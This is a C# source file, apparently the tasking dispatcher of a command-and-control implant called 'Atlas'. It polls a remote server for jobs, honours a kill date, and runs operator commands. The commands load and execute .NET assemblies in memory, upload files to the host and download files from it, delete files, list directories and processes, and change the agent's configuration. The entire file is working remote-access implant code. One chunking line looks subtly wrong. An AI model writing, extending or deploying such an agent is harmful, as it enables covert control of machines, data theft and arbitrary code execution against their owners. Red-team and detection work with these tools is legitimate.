using System;
using System.Threading;
using System.Linq;
using System.IO;

namespace Atlas {
    class Dispatch {
        public static void Loop(Messages.JobList JobList)
        {
            if (!Utils.CheckDate())
            {
                Environment.Exit(1);
            }
            Http.GetTasking(JobList);
            StartDispatch(JobList);
            Http.PostResponse(JobList);
        }

        public static bool StartDispatch (Messages.JobList JobList)
        {
            try
            {
                foreach (Messages.Job Job in JobList.jobs)
                {
                    if (!Job.job_started)
                    {
                        if (Job.command == "loadassembly")
                        {
                            if (Job.chunk_num == Job.total_chunks)
                            {
                                Thread thread = new Thread(() => ExecuteTasking(Job));
                                thread.Start();
                                Job.job_started = true;
                                Job.thread = thread;
                            }
                        }
                        else if (Job.command == "upload")
                        {
                            if (Job.chunks.Count == 0)
                            {
                                break;
                            }
                            else
                            {
                                Thread thread = new Thread(() => ExecuteTasking(Job));
                                thread.Start();
                                Job.thread = thread;
                            }
                        }
                        else if (Job.download)
                        {
                            if (Job.file_id == null)
                            {
                                if (!System.IO.File.Exists(Job.parameters))
                                {
                                    Job.response = "Error file does not exists";
                                    Job.completed = true;
                                    Job.success = false;
                                    Job.total_chunks = 0;
                                }
                                else
                                {
                                    Job.path = FileManagement.Download.GetPath(Job.parameters);
                                    Job.total_chunks = (int)FileManagement.Download.GetTotalChunks(Job.parameters);
                                    Job.file_size = FileManagement.Download.GetFileSize(Job.parameters);
                                    Job.completed = true;
                                    Job.success = true;
                                }
                            }
                            else if (Job.chunks.Count > 1)
                            {
                                break;
                            }
                            else
                            {
                                ExecuteTasking(Job);
                            }
                        }
                        else
                        {
                            Thread thread = new Thread(() => ExecuteTasking(Job));
                            thread.Start();
                            Job.job_started = true;
                            Job.thread = thread;
                        }
                    }
                }
                return true;
            }
            catch
            {
                return false;
            }
        }

        public static void ExecuteTasking(Messages.Job Job)
        {
            try
            {
                switch (Job.command.ToLower())
                {
                    case "loadassembly":
                        byte[] assembly = AssemblyManagement.GetAssembly(Job.chunks, Job.total_chunks);
                        if (AssemblyManagement.Load(Job.file_id, Convert.ToBase64String(assembly)))
                        {
                            Job.completed = true;
                            Job.response = "assembly successfully loaded";
                            Job.success = true;
                        }
                        else
                        {
                            Job.completed = true;
                            Job.response = "assembly could not be loaded";
                            Job.success = false;
                        }
                        break;
                    case "runassembly":
                        Messages.RunAssembly runAssembly = Messages.RunAssembly.FromJson(Job.parameters);
                        if (!AssemblyManagement.Check(runAssembly.assembly_id))
                        {
                            Job.response = "assembly not loaded";
                            Job.completed = true;
                            Job.success = false;
                            break;
                        }
                        string[] args = new string[] { };
                        if (runAssembly.args.Length >= 2)
                        {
                            args = runAssembly.args.Split(' ');
                        }
                        else
                        {
                            args = new string[] { runAssembly.args };
                        }
                        string response = AssemblyManagement.Invoke(runAssembly.assembly_id, args);
                        if (response.Length < Config.ChunkSize)
                        {
                            Job.response = response;
                        }
                        else
                        {
                            Job.total_chunks = (response.Length + Config.ChunkSize - 1) / Config.ChunkSize;
                            int count = 0;
                            while (count != Job.total_chunks)
                            {
                                if (count + 1 == Job.total_chunks)
                                {
                                    int size = response.Length - (count * Config.ChunkSize);
                                    Job.chunks.Add(response.Substring((count * Config.ChunkSize), count));
                                    count++;
                                }
                                else
                                {
                                    Job.chunks.Add(response.Substring((count * Config.ChunkSize), Config.ChunkSize));
                                    count++;
                                }
                            }
                        }
                        Job.completed = true;
                        if (Job.response != "\r\n")
                        {
                            Job.success = true;
                        }
                        else
                        {
                            Job.success = false;
                        }
                        break;
                    case "listloaded":
                        if (!Config.Modules.Any())
                        {
                            Job.response = "no assemblies loaded";
                            Job.completed = true;
                            Job.success = false;
                            break;
                        }
                        string Assemblies = AssemblyManagement.ListAssemblies();
                        Job.response = Assemblies;
                        Job.completed = true;
                        Job.success = true;
                        break;
                    case "download":
                        if (Job.chunk_num != Job.total_chunks)
                        {
                            string chunk = FileManagement.Download.GetChunk(Job.parameters, Job.chunk_num, Job.total_chunks, Job.file_size);
                            Job.chunks.Add(chunk);
                            Job.chunk_num++;
                        }
                        break;
                    case "upload":
                        if (Job.write_num == 0)
                        {
                            if (System.IO.File.Exists(Job.path))
                            {
                                Job.response = "Error file already exists";
                                Job.completed = true;
                                Job.success = false;
                            }
                        }
                        if (Job.chunks.Count != 0)
                        {
                            if(FileManagement.Upload(Job.path, Job.chunks[0]))
                            {
                                Job.write_num++;
                                Job.chunks.Remove(Job.chunks[0]);
                            }
                        }
                        if (Job.write_num == Job.total_chunks)
                        {
                            Job.response = "File successfully uploaded";
                            Job.completed = true;
                            Job.success = true;
                        }
                        break;
                    case "config":
                        if (Job.parameters.ToLower() == "info")
                        {
                            Job.response = ConfigManagement.GetConfig();
                            Job.completed = true;
                            Job.success = true;
                        }
                        else if(ConfigManagement.SetConfig(Job.parameters.ToLower()))
                        {
                            Job.response = "Configuration successfully updated";
                            Job.completed = true;
                            Job.success = true;
                        }
                        else
                        {
                            Job.response = "Error could not update config";
                            Job.completed = true;
                            Job.success = false;
                        }
                        break;
                    case "exit":
                        Environment.Exit(1);
                        break;
                    case "jobs":
                        break;
                    case "jobkill":
                        break;
                    case "pwd":
                        Job.response = Directory.GetCurrentDirectory();
                        Job.completed = true;
                        Job.success = true;
                        break;
                    case "cd":
                        if (Directory.Exists(Job.parameters))
                        {
                            Directory.SetCurrentDirectory(Job.parameters);
                            Job.response = "New current directory: " + Directory.GetCurrentDirectory();
                            Job.success = true;
                            Job.completed = true;
                        }
                        else
                        {
                            Job.response = "Could not find directory";
                            Job.success = false;
                            Job.completed = true;
                        }
                        break;
                    case "rm":
                        if (File.Exists(Job.parameters))
                        {
                            File.Delete(Job.parameters);
                            if (File.Exists(Job.parameters))
                            {
                                Job.response = "Could not delete file";
                                Job.success = false;
                                Job.completed = true;
                            }
                            else
                            {
                                Job.response = "Successfully deleted file";
                                Job.success = true;
                                Job.completed = true;
                            }
                        }
                        else
                        {
                            Job.response = "File does not exists";
                            Job.success = false;
                            Job.completed = true;
                        }
                        break;
                    case "ls":
                        if (Job.parameters == "")
                        {
                            Job.parameters = ".";
                        }
                        if (Directory.Exists(Job.parameters))
                        {
                            Messages.DirectoryList directoryList = FileManagement.DirectoryListing(Job.parameters);
                            Job.response = Messages.DirectoryList.ToJson(directoryList);
                            Job.success = true;
                            Job.completed = true;
                        }
                        else if (File.Exists(Job.parameters))
                        {
                            Messages.DirectoryList directoryList = FileManagement.DirectoryListing(Job.parameters);
                            Job.response = Messages.DirectoryList.ToJson(directoryList);
                            Job.success = true;
                            Job.completed = true;
                        }
                        else
                        {
                            Job.response = "Cannot find directory";
                            Job.success = false;
                            Job.completed = true;
                        }
                        break;
                    case "ps":
                        Messages.ProcessList processList = ProcessManagement.ProcessList.GetProcessList();
                        Job.response = Messages.ProcessList.ToJson(processList);
                        Job.success = true;
                        Job.completed = true;
                        break;
                    default:
                        Job.response = "Command not implemented";
                        Job.success = false;
                        Job.completed = true;
                        break;
                }
            }
            catch (Exception e)
            {
                        Job.completed = true;
                        Job.response = $"Hit an exception: '{e}'";
                        Job.success = false;
            }
        }
    }
}